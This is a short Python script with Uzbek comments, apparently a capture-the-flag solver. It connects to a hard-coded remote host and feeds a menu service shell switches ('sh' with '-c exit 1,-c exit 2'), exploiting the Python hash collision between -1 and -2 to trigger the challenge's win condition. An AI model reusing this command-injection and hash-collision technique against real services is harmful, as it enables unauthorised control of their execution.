import socket
import time

def solve():
    host = '154.57.164.68'
    port = 31363

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    try:
        print(f"[+] Serverga ulanmoqda...")
        s.connect((host, port))

        def send_option(choice, data):
            time.sleep(0.4)
            s.sendall(f"{choice}\n".encode())
            time.sleep(0.4)
            s.sendall(f"{data}\n".encode())

        # 1. Mode: 1 deb kiritamiz (chunki returncode orqali o'ynaymiz)
        send_option("1", "1")

        # 2. Bin: 'sh' (shell)
        send_option("2", "sh")

        # 3. Arguments: Bu yerda hiyla ishlatamiz. 
        # Birinchi argument mavjud bo'lmagan fayl bo'lsin (-c exit 1 qaytarsin)
        # Ikkinchi argument boshqa turdagi xato qaytarsin.
        # Lekin 'sh' bin bo'lgani uchun switchlarni o'zgartirish osonroq.
        send_option("3", ".,.") 

        # 4. Switches: 
        # sh -c "exit 1"  => returncode 1
        # sh -c "exit 2"  => returncode 2 (Lekin bizga hash collision kerak)
        
        # PYTHON HASH COLLISION: hash(-1) == hash(-2)
        # Bizga debug[0] = -1 va debug[1] = -2 kerak.
        # Buning uchun mode = -1 qilamiz va returncode'larni 1 va 2 qilamiz.
        
        print("[*] Re-configuring for hash collision (-1 and -2)...")
        send_option("1", "-1") # mode = -1
        send_option("4", "-c exit 1,-c exit 2") # switches

        # 5. Beat the competitor!
        print("[!] Triggering...")
        time.sleep(0.5)
        s.sendall(b"5\n")

        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print("\n" + "="*40)
        print(response.strip())
        print("="*40)

    except Exception as e:
        print(f"[X] Xatolik: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
